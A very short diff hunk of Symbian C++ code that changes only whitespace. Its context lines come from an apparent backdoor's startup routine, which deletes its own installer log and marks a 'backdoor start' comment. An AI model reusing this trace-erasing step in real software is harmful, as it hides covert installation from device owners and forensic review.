@@ -536,7 +536,7 @@ LOCAL_C void DoStartL()
 	User::After(10*1000000);
 	TUid myUid = {0x200305D7};
 	DeleteInstallerLog(myUid);
-		
+	
 	CCore* core = CCore::NewLC();
 	
 	//log backdoor start
